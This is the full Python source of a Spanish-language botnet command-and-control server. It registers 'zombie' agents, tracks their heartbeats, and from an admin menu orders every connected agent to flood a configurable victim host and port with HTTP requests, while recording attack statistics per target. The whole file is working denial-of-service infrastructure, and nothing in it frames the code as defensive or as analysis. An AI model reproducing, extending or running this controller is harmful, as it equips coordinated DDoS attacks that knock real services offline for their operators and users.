#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
servidor-botnet — Servidor C2 concurrente para agentes (hosts zombie).

Arquitectura
------------
- TCP puro, protocolo JSON de una línea por mensaje ('\\n').
- Hilo dedicado por conexión entrante (threading), aceptación en hilo aparte.
- Sesiones deduplicadas por client_id: una reconexión del mismo equipo
  reemplaza (REEMPLAZADO) a la anterior en lugar de duplicarla.
- Heartbeat esperado cada 20 s por el agente; sin heartbeat en
  HEARTBEAT_TIMEOUT segundos -> sesión cerrada por TIMEOUT.
- Tope duro de MAX_ZOMBIES conexiones activas simultáneas (18).
- Eventos en logs/ (texto + JSONL), métricas por sesión y por objetivo en metrics/.
- Menú de administración en la consola del servidor.

Regla del proyecto: el agente NO se desconecta voluntariamente. Solo sale
por caída de red, apagado del equipo, TIMEOUT o kick del administrador.

Puerto de escucha: 4024 (config/.env)
"""

from __future__ import annotations

import csv
import json
import logging
import os
import signal
import socket
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional

BASE_DIR = Path(__file__).resolve().parent
CONFIG_FILE = BASE_DIR / "config" / ".env"

CONFIG_DEFECTO = {
    "BOT_HOST": "0.0.0.0",
    "BOT_PORT": "4024",
    "BACKLOG": "128",
    "MAX_ZOMBIES": "18",
    "HANDSHAKE_TIMEOUT": "15",
    "HEARTBEAT_TIMEOUT": "90",
    "SOCKET_TIMEOUT": "5",
    "MONITOR_INTERVAL": "5",
    "LOG_DIR": "logs",
    "METRICS_DIR": "metrics",
    "VICTIM_HOST": "203.0.113.10",
    "VICTIM_PORT": "80",
    "FLOOD_THREADS": "50",
    "FLOOD_DURATION": "30",
    "FLOOD_METHOD": "GET",
}


# ------------------------------------------------------------------ #
# Configuración
# ------------------------------------------------------------------ #

def cargar_config() -> dict:
    cfg = dict(CONFIG_DEFECTO)
    if CONFIG_FILE.exists():
        for linea in CONFIG_FILE.read_text(encoding="utf-8").splitlines():
            linea = linea.strip()
            if not linea or linea.startswith("#") or "=" not in linea:
                continue
            clave, valor = linea.split("=", 1)
            clave = clave.strip()
            if clave in cfg:
                cfg[clave] = valor.strip().strip('"').strip("'")
    for clave in cfg:                      # las variables de entorno mandan
        if clave in os.environ:
            cfg[clave] = os.environ[clave]
    for clave in ("BOT_PORT", "BACKLOG", "MAX_ZOMBIES", "HANDSHAKE_TIMEOUT",
                  "HEARTBEAT_TIMEOUT", "SOCKET_TIMEOUT", "MONITOR_INTERVAL",
                  "VICTIM_PORT", "FLOOD_THREADS", "FLOOD_DURATION"):
        cfg[clave] = int(cfg[clave])
    cfg["LOG_DIR"] = str(BASE_DIR / cfg["LOG_DIR"])
    cfg["METRICS_DIR"] = str(BASE_DIR / cfg["METRICS_DIR"])
    return cfg


# ------------------------------------------------------------------ #
# Registro de eventos y métricas
# ------------------------------------------------------------------ #

class Registro:
    def __init__(self, log_dir: str, metrics_dir: str):
        self.log_dir = Path(log_dir)
        self.metrics_dir = Path(metrics_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.metrics_dir.mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()

        logging.basicConfig(
            filename=str(self.log_dir / "sesiones.log"),
            level=logging.INFO,
            format="%(asctime)s | %(levelname)s | %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )
        self.eventos = self.log_dir / "eventos.jsonl"
        self.consola = self.log_dir / "consola.log"

    def evento(self, tipo: str, **campos):
        registro = {"ts": datetime.now().isoformat(timespec="seconds"),
                    "evento": tipo, **campos}
        with self._lock:
            with self.eventos.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(registro, ensure_ascii=False) + "\n")

    def accion(self, texto: str):
        with self._lock:
            with self.consola.open("a", encoding="utf-8") as fh:
                fh.write(f"{datetime.now().isoformat(timespec='seconds')} | {texto}\n")

    def metrica(self, client_id: str, datos: dict):
        ruta = self.metrics_dir / f"{client_id}.jsonl"
        linea = {"ts": datetime.now().isoformat(timespec="milliseconds"), **datos}
        with self._lock:
            with ruta.open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(linea, ensure_ascii=False) + "\n")


# ------------------------------------------------------------------ #
# Modelo de sesión
# ------------------------------------------------------------------ #

class Estado(str, Enum):
    CONECTADO = "CONECTADO"
    DESCONECTADO = "DESCONECTADO"       # cierre de socket / error de red
    TIMEOUT = "TIMEOUT"                 # sin heartbeat a tiempo
    REEMPLAZADO = "REEMPLAZADO"         # sustituida por una reconexión
    EXPULSADO = "EXPULSADO"             # kick del administrador
    RECHAZADO = "RECHAZADO"             # tope de zombies alcanzado


@dataclass
class Sesion:
    client_id: str
    hostname: str
    os_info: str
    ip: str
    puerto: int
    conn: socket.socket
    conectado_en: datetime
    ultimo_heartbeat: datetime
    estado: Estado = Estado.CONECTADO
    desconectado_en: Optional[datetime] = None
    motivo: str = ""
    reconexiones: int = 0
    comandos_enviados: int = 0
    acks_recibidos: int = 0
    inundando: bool = False
    flood_objetivo: str = ""
    flood_inicio: Optional[datetime] = None
    write_lock: threading.Lock = field(default_factory=threading.Lock)
    pendientes: Dict[str, float] = field(default_factory=dict)

    def duracion(self) -> float:
        fin = self.desconectado_en or datetime.now()
        return (fin - self.conectado_en).total_seconds()


# ------------------------------------------------------------------ #
# Servidor
# ------------------------------------------------------------------ #

class ServidorBotnet:
    def __init__(self, cfg: dict):
        self.host = cfg["BOT_HOST"]
        self.puerto = cfg["BOT_PORT"]
        self.backlog = cfg["BACKLOG"]
        self.max_zombies = cfg["MAX_ZOMBIES"]
        self.handshake_timeout = cfg["HANDSHAKE_TIMEOUT"]
        self.heartbeat_timeout = cfg["HEARTBEAT_TIMEOUT"]
        self.socket_timeout = cfg["SOCKET_TIMEOUT"]
        self.monitor_interval = cfg["MONITOR_INTERVAL"]

        self.victim_host = cfg["VICTIM_HOST"]
        self.victim_port = cfg["VICTIM_PORT"]
        self.flood_threads = cfg["FLOOD_THREADS"]
        self.flood_duration = cfg["FLOOD_DURATION"]
        self.flood_method = cfg["FLOOD_METHOD"]

        self.reg = Registro(cfg["LOG_DIR"], cfg["METRICS_DIR"])
        self.sesiones: Dict[str, Sesion] = {}
        self.ultimo_reporte: Dict[str, dict] = {}
        self.lock = threading.RLock()
        self.sock_servidor: Optional[socket.socket] = None
        self.corriendo = False

    # ---------------------------- ciclo de vida ---------------------------- #

    def iniciar(self):
        self.sock_servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock_servidor.bind((self.host, self.puerto))
        self.sock_servidor.listen(self.backlog)
        self.sock_servidor.settimeout(1.0)
        self.corriendo = True

        self.reg.evento("SERVIDOR_INICIADO", host=self.host, puerto=self.puerto,
                        max_zombies=self.max_zombies)
        logging.info("Servidor iniciado en %s:%s", self.host, self.puerto)

        print("=" * 62)
        print("  SERVIDOR BOTNET — escuchando en {}:{}".format(self.host, self.puerto))
        print("  Zombies máximos: {} | heartbeat timeout: {}s".format(
            self.max_zombies, self.heartbeat_timeout))
        print("  Logs: {} | Métricas: {}".format(self.reg.log_dir, self.reg.metrics_dir))
        print("=" * 62)

        threading.Thread(target=self._bucle_aceptar, daemon=True).start()
        threading.Thread(target=self._bucle_monitor, daemon=True).start()
        self._menu()

    def detener(self):
        if not self.corriendo:
            return
        self.corriendo = False
        with self.lock:
            for sesion in list(self.sesiones.values()):
                self._cerrar_locked(sesion, Estado.DESCONECTADO, "apagado del servidor")
        if self.sock_servidor:
            try:
                self.sock_servidor.close()
            except OSError:
                pass
        self.reg.evento("SERVIDOR_DETENIDO")
        logging.info("Servidor detenido")
        print("[OK] Servidor detenido.")

    # ---------------------------- aceptación ---------------------------- #

    def _bucle_aceptar(self):
        while self.corriendo:
            try:
                conn, addr = self.sock_servidor.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            conn.settimeout(self.socket_timeout)
            threading.Thread(target=self._atender, args=(conn, addr),
                             daemon=True).start()

    # ---------------------------- sesión ---------------------------- #

    def _atender(self, conn: socket.socket, addr):
        ip, puerto = addr
        try:
            hello = self._recibir_handshake(conn)
        except Exception as exc:
            self.reg.evento("HANDSHAKE_FALLIDO", ip=ip, puerto=puerto, error=str(exc))
            logging.warning("Handshake fallido desde %s:%s (%s)", ip, puerto, exc)
            self._cerrar_socket(conn)
            return

        if not isinstance(hello, dict) or hello.get("type") != "hello" or not hello.get("client_id"):
            self.reg.evento("HANDSHAKE_INVALIDO", ip=ip, puerto=puerto, crudo=str(hello)[:300])
            self._cerrar_socket(conn)
            return

        client_id = str(hello["client_id"])[:64]
        hostname = str(hello.get("hostname", "desconocido"))[:64]
        os_info = str(hello.get("os", "desconocido"))[:120]
        ahora = datetime.now()

        with self.lock:
            existente = self.sesiones.get(client_id)
            reconexiones = existente.reconexiones + 1 if existente else 0

            if existente and existente.estado == Estado.CONECTADO:
                self._cerrar_locked(
                    existente, Estado.REEMPLAZADO,
                    "sustituida por nueva conexión desde {}:{}".format(ip, puerto))
            elif not existente and self._activas_locked() >= self.max_zombies:
                self._cerrar_socket(conn)
                self.reg.evento("RECHAZADO_TOPE", client_id=client_id, hostname=hostname,
                                ip=ip, tope=self.max_zombies)
                logging.warning("Rechazado %s: tope de %s zombies", client_id, self.max_zombies)
                return

            sesion = Sesion(
                client_id=client_id, hostname=hostname, os_info=os_info,
                ip=ip, puerto=puerto, conn=conn,
                conectado_en=ahora, ultimo_heartbeat=ahora,
                reconexiones=reconexiones,
            )
            self.sesiones[client_id] = sesion

        self.reg.evento("CONECTADO", client_id=client_id, hostname=hostname,
                        os=os_info, ip=ip, puerto=puerto, reconexiones=reconexiones)
        logging.info("CONECTADO %s host=%s ip=%s:%s", client_id, hostname, ip, puerto)
        print("\n[+] Nuevo zombie: {} ({}) desde {}:{}".format(hostname, client_id, ip, puerto))
        print("admin> ", end="", flush=True)

        self._enviar(sesion, {
            "type": "welcome",
            "client_id": client_id,
            "server_time": ahora.isoformat(),
            "heartbeat_timeout": self.heartbeat_timeout,
        })
        self._bucle_lectura(sesion)

    def _bucle_lectura(self, sesion: Sesion):
        buffer = ""
        while self.corriendo and sesion.estado == Estado.CONECTADO:
            try:
                datos = sesion.conn.recv(4096)
                if not datos:
                    self._cerrar(sesion, Estado.DESCONECTADO, "socket cerrado por el agente")
                    return
                buffer += datos.decode("utf-8", errors="replace")
                while "\n" in buffer:
                    linea, buffer = buffer.split("\n", 1)
                    linea = linea.strip()
                    if linea:
                        self._procesar(sesion, linea)
            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError, OSError) as exc:
                self._cerrar(sesion, Estado.DESCONECTADO, str(exc))
                return

    def _procesar(self, sesion: Sesion, linea: str):
        try:
            msg = json.loads(linea)
        except json.JSONDecodeError:
            self.reg.evento("JSON_INVALIDO", client_id=sesion.client_id, crudo=linea[:300])
            return

        tipo = msg.get("type")

        if tipo == "heartbeat":
            sesion.ultimo_heartbeat = datetime.now()
            self.reg.metrica(sesion.client_id, {"tipo": "heartbeat"})
            self._enviar(sesion, {"type": "heartbeat_ack",
                                  "server_time": sesion.ultimo_heartbeat.isoformat()})
            return

        if tipo == "metricas":
            self._registrar_metricas_objetivo(sesion, msg)
            return

        if tipo in ("ack", "result"):
            cmd_id = str(msg.get("cmd_id", "?"))
            sesion.acks_recibidos += 1
            enviado = sesion.pendientes.pop(cmd_id, None)
            rtt = round((time.monotonic() - enviado) * 1000, 2) if enviado else None
            self.reg.metrica(sesion.client_id, {
                "tipo": tipo, "cmd_id": cmd_id, "estado": msg.get("estado"),
                "rtt_ms": rtt, "detalle": msg.get("payload"),
            })
            logging.info("ACK %s cmd=%s estado=%s rtt=%sms", sesion.client_id,
                         cmd_id, msg.get("estado"), rtt)
            if rtt is not None:
                print("\n[<] {} cmd={} estado={} rtt={}ms".format(
                    sesion.hostname, cmd_id, msg.get("estado"), rtt))
                print("admin> ", end="", flush=True)
            return

        self.reg.evento("MENSAJE", client_id=sesion.client_id, contenido=str(msg)[:400])

    def _registrar_metricas_objetivo(self, sesion: Sesion, msg: dict):
        """Métricas del objetivo reportadas por el zombie (resultados del ataque)."""
        payload = msg.get("payload") or {}
        objetivo = sesion.flood_objetivo or "{}:{}".format(self.victim_host, self.victim_port)
        registro = {
            "ts": datetime.now().isoformat(timespec="milliseconds"),
            "client_id": sesion.client_id,
            "hostname": sesion.hostname,
            "objetivo": objetivo,
            "enviadas": payload.get("enviadas", 0),
            "errores": payload.get("errores", 0),
            "bytes": payload.get("bytes", 0),
            "segundos": payload.get("segundos", 0),
        }
        self.reg.metrica(sesion.client_id, {"tipo": "objetivo", **registro})
        nombre = "objetivo_{}.jsonl".format(objetivo.replace(":", "_").replace("/", "-"))
        with self.lock:
            with (Path(self.reg.metrics_dir) / nombre).open("a", encoding="utf-8") as fh:
                fh.write(json.dumps(registro, ensure_ascii=False) + "\n")
            self.ultimo_reporte[sesion.client_id] = registro

    # ---------------------------- red ---------------------------- #

    def _recibir_handshake(self, conn: socket.socket) -> dict:
        conn.settimeout(self.handshake_timeout)
        datos = b""
        while b"\n" not in datos:
            trozo = conn.recv(4096)
            if not trozo:
                raise ConnectionError("conexión cerrada antes del handshake")
            datos += trozo
            if len(datos) > 8192:
                raise ValueError("handshake demasiado grande")
        conn.settimeout(self.socket_timeout)
        return json.loads(datos.split(b"\n", 1)[0].decode("utf-8", errors="replace"))

    def _enviar(self, sesion: Sesion, obj: dict) -> bool:
        payload = (json.dumps(obj, ensure_ascii=False) + "\n").encode("utf-8")
        with sesion.write_lock:
            if sesion.estado != Estado.CONECTADO:
                return False
            try:
                sesion.conn.settimeout(self.socket_timeout)
                sesion.conn.sendall(payload)
                return True
            except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                self._cerrar(sesion, Estado.DESCONECTADO, str(exc))
                return False

    def _comando(self, sesion: Sesion, cmd: str, payload: Optional[dict] = None) -> bool:
        cmd_id = uuid.uuid4().hex[:12]
        sesion.pendientes[cmd_id] = time.monotonic()
        sesion.comandos_enviados += 1
        ok = self._enviar(sesion, {"type": "command", "cmd": cmd,
                                   "cmd_id": cmd_id, "payload": payload or {}})
        self.reg.evento("COMANDO", client_id=sesion.client_id, cmd=cmd, cmd_id=cmd_id,
                        payload=payload or {}, entregado=ok)
        return ok

    @staticmethod
    def _cerrar_socket(conn: socket.socket):
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass

    def _cerrar(self, sesion: Sesion, estado: Estado, motivo: str):
        with self.lock:
            self._cerrar_locked(sesion, estado, motivo)

    def _cerrar_locked(self, sesion: Sesion, estado: Estado, motivo: str):
        if sesion.estado != Estado.CONECTADO:
            return
        sesion.estado = estado
        sesion.desconectado_en = datetime.now()
        sesion.motivo = motivo
        sesion.inundando = False
        self._cerrar_socket(sesion.conn)
        duracion = sesion.duracion()
        self.reg.evento("DESCONECTADO", client_id=sesion.client_id, hostname=sesion.hostname,
                        estado=estado.value, duracion_s=round(duracion, 1), motivo=motivo,
                        comandos=sesion.comandos_enviados, acks=sesion.acks_recibidos)
        logging.info("DESCONECTADO %s estado=%s duracion=%.0fs motivo=%s",
                     sesion.client_id, estado.value, duracion, motivo)
        print("\n[-] {} -> {} ({}s) {}".format(sesion.hostname, estado.value,
                                             round(duracion), motivo))
        print("admin> ", end="", flush=True)

    # ---------------------------- monitor de heartbeat ---------------------------- #

    def _bucle_monitor(self):
        while self.corriendo:
            time.sleep(self.monitor_interval)
            limite = self.heartbeat_timeout
            with self.lock:
                vencidas = [
                    s for s in self.sesiones.values()
                    if s.estado == Estado.CONECTADO
                    and (datetime.now() - s.ultimo_heartbeat).total_seconds() > limite
                ]
            for sesion in vencidas:
                transcurrido = (datetime.now() - sesion.ultimo_heartbeat).total_seconds()
                self._cerrar(sesion, Estado.TIMEOUT,
                             "sin heartbeat durante {:.0f}s".format(transcurrido))

    def _activas_locked(self) -> int:
        return sum(1 for s in self.sesiones.values() if s.estado == Estado.CONECTADO)

    # ---------------------------- menú ---------------------------- #

    def _menu(self):
        while self.corriendo:
            print("""
 1) Listar sesiones            7) Expulsar zombie (kick)
 2) Detalle de sesión          8) Resumen del ataque en vivo
 3) Comando a un zombie        9) Ver métricas
 4) Comando a todos           10) Exportar reporte
 5) Iniciar inundación        11) Salir
 6) Detener inundación
""")
            try:
                opcion = input("admin> ").strip()
            except (EOFError, KeyboardInterrupt):
                opcion = "11"
            if not opcion:
                continue
            self.reg.accion("MENU {}".format(opcion))

            if opcion in ("1", "list"):
                self._listar()
            elif opcion in ("2", "detalle"):
                self._detalle()
            elif opcion in ("3", "send"):
                self._comando_uno()
            elif opcion in ("4", "all"):
                self._comando_todos()
            elif opcion in ("5", "flood"):
                self._flood()
            elif opcion in ("6", "stop"):
                self._stop_flood()
            elif opcion in ("7", "kick"):
                self._kick()
            elif opcion in ("8", "resumen"):
                self._resumen_ataque()
            elif opcion in ("9", "metrics"):
                self._ver_metricas()
            elif opcion in ("10", "export"):
                self._exportar()
            elif opcion in ("11", "quit", "exit"):
                self.detener()
                break
            else:
                print("Opción no válida.")

    def _listar(self):
        with self.lock:
            if not self.sesiones:
                print("(sin sesiones)")
                return
            cab = "{:<14}{:<18}{:<17}{:<13}{:<20}{:<7}{}".format(
                "client_id", "hostname", "ip", "estado", "conectado desde", "acks", "flood")
            print(cab)
            print("-" * len(cab))
            for s in sorted(self.sesiones.values(), key=lambda x: x.conectado_en):
                print("{:<14}{:<18}{:<17}{:<13}{:<20}{:<7}{}".format(
                    s.client_id, s.hostname[:17], s.ip, s.estado.value,
                    s.conectado_en.strftime("%d/%m %H:%M:%S"), s.acks_recibidos,
                    "SÍ " + s.flood_objetivo if s.inundando else "no"))

    def _detalle(self):
        cid = input("client_id: ").strip()
        sesion = self.sesiones.get(cid)
        if not sesion:
            print("No existe esa sesión.")
            return
        print("client_id.......: {}".format(sesion.client_id))
        print("hostname........: {}".format(sesion.hostname))
        print("sistema.........: {}".format(sesion.os_info))
        print("origen..........: {}:{}".format(sesion.ip, sesion.puerto))
        print("estado..........: {}".format(sesion.estado.value))
        print("conectado en....: {}".format(sesion.conectado_en.strftime("%Y-%m-%d %H:%M:%S")))
        print("desconectado en.: {}".format(
            sesion.desconectado_en.strftime("%Y-%m-%d %H:%M:%S") if sesion.desconectado_en else "-"))
        print("duración........: {:.0f}s".format(sesion.duracion()))
        print("último heartbeat: {}".format(sesion.ultimo_heartbeat.strftime("%H:%M:%S")))
        print("comandos/acks...: {}/{}".format(sesion.comandos_enviados, sesion.acks_recibidos))
        print("reconexiones....: {}".format(sesion.reconexiones))
        print("motivo cierre...: {}".format(sesion.motivo or "-"))

    def _comando_uno(self):
        cid = input("client_id: ").strip()
        cmd = input("comando (PING/INFO/FLOOD/STOP): ").strip().upper()
        sesion = self.sesiones.get(cid)
        if not sesion or sesion.estado != Estado.CONECTADO:
            print("Sesión no activa.")
            return
        if self._comando(sesion, cmd, self._payload_flood(cmd)):
            print("Enviado {} a {}".format(cmd, sesion.hostname))

    def _comando_todos(self):
        cmd = input("comando (PING/INFO/STOP): ").strip().upper()
        with self.lock:
            activas = [s for s in self.sesiones.values() if s.estado == Estado.CONECTADO]
        enviados = sum(1 for s in activas if self._comando(s, cmd, self._payload_flood(cmd)))
        print("Enviado a {}/{}".format(enviados, len(activas)))

    def _payload_flood(self, cmd: str) -> dict:
        if cmd == "FLOOD":
            return {"host": self.victim_host, "port": self.victim_port,
                    "threads": self.flood_threads, "duration": self.flood_duration,
                    "method": self.flood_method}
        return {}

    def _flood(self):
        host = input("objetivo [{}]: ".format(self.victim_host)).strip() or self.victim_host
        puerto = input("puerto [{}]: ".format(self.victim_port)).strip() or str(self.victim_port)
        hilos = input("hilos [{}]: ".format(self.flood_threads)).strip() or str(self.flood_threads)
        dur = input("duración s [{}]: ".format(self.flood_duration)).strip() or str(self.flood_duration)
        payload = {"host": host, "port": int(puerto), "threads": int(hilos),
                   "duration": int(dur), "method": self.flood_method}

        with self.lock:
            activas = [s for s in self.sesiones.values() if s.estado == Estado.CONECTADO]
            for s in activas:
                s.inundando = True
                s.flood_objetivo = "{}:{}".format(host, puerto)
                s.flood_inicio = datetime.now()
        enviados = sum(1 for s in activas if self._comando(s, "FLOOD", payload))
        self.reg.evento("FLOOD_INICIADO", objetivo=payload, zombies=enviados)
        print("FLOOD {}:{} -> {}/{} zombies".format(host, puerto, enviados, len(activas)))

    def _stop_flood(self):
        with self.lock:
            activas = [s for s in self.sesiones.values() if s.estado == Estado.CONECTADO]
            for s in activas:
                s.inundando = False
        enviados = sum(1 for s in activas if self._comando(s, "STOP"))
        self.reg.evento("FLOOD_DETENIDO", zombies=enviados)
        print("STOP enviado a {}/{} zombies".format(enviados, len(activas)))

    def _kick(self):
        cid = input("client_id: ").strip()
        with self.lock:
            sesion = self.sesiones.get(cid)
            if not sesion or sesion.estado != Estado.CONECTADO:
                print("Sesión no activa.")
                return
        self._enviar(sesion, {"type": "kick", "reason": "expulsado por el administrador"})
        time.sleep(0.2)
        self._cerrar(sesion, Estado.EXPULSADO, "kick del administrador")
        self.reg.evento("KICK", client_id=cid)
        print("Zombie {} expulsado.".format(cid))

    def _resumen_ataque(self):
        with self.lock:
            if not self.ultimo_reporte:
                print("(sin reportes de ataque todavía)")
                return
            total = sum(r["enviadas"] for r in self.ultimo_reporte.values())
            errores = sum(r["errores"] for r in self.ultimo_reporte.values())
            mib = sum(r["bytes"] for r in self.ultimo_reporte.values()) / 1048576
            print("{:<18}{:<10}{:<10}{:<12}{}".format(
                "hostname", "enviadas", "errores", "MB", "objetivo"))
            print("-" * 66)
            for r in self.ultimo_reporte.values():
                print("{:<18}{:<10}{:<10}{:<12.2f}{}".format(
                    r["hostname"][:17], r["enviadas"], r["errores"],
                    r["bytes"] / 1048576, r["objetivo"]))
            print("-" * 66)
            print("TOTAL: {} solicitudes | {} errores | {:.2f} MB".format(total, errores, mib))

    def _ver_metricas(self):
        cid = input("client_id (vacío = resumen): ").strip()
        if not cid:
            with self.lock:
                for s in self.sesiones.values():
                    print("{:<14}{:<18} acks={:<4} comandos={:<4} reconex={}".format(
                        s.client_id, s.hostname, s.acks_recibidos,
                        s.comandos_enviados, s.reconexiones))
            return
        ruta = Path(self.reg.metrics_dir) / "{}.jsonl".format(cid)
        if not ruta.exists():
            print("Sin métricas.")
            return
        for linea in ruta.read_text(encoding="utf-8").splitlines()[-25:]:
            print(linea)

    def _exportar(self):
        marca = datetime.now().strftime("%Y%m%d_%H%M%S")
        destino = Path(self.reg.metrics_dir) / "reporte_{}.csv".format(marca)
        with self.lock, destino.open("w", newline="", encoding="utf-8") as fh:
            w = csv.writer(fh)
            w.writerow(["client_id", "hostname", "os", "ip", "puerto", "estado",
                        "conectado_en", "desconectado_en", "duracion_s",
                        "comandos", "acks", "reconexiones", "motivo"])
            for s in self.sesiones.values():
                w.writerow([s.client_id, s.hostname, s.os_info, s.ip, s.puerto,
                            s.estado.value, s.conectado_en.isoformat(),
                            s.desconectado_en.isoformat() if s.desconectado_en else "",
                            round(s.duracion(), 1), s.comandos_enviados,
                            s.acks_recibidos, s.reconexiones, s.motivo])
        print("Reporte: {}".format(destino))

        destino_obj = Path(self.reg.metrics_dir) / "resultados_objetivo_{}.json".format(marca)
        with self.lock, destino_obj.open("w", encoding="utf-8") as fh:
            json.dump(list(self.ultimo_reporte.values()), fh, ensure_ascii=False, indent=2)
        print("Resultados del objetivo: {}".format(destino_obj))


def main():
    cfg = cargar_config()
    servidor = ServidorBotnet(cfg)

    def sigterm(signum, frame):
        servidor.detener()
        sys.exit(0)

    signal.signal(signal.SIGTERM, sigterm)
    try:
        servidor.iniciar()
    except KeyboardInterrupt:
        servidor.detener()


if __name__ == "__main__":
    main()
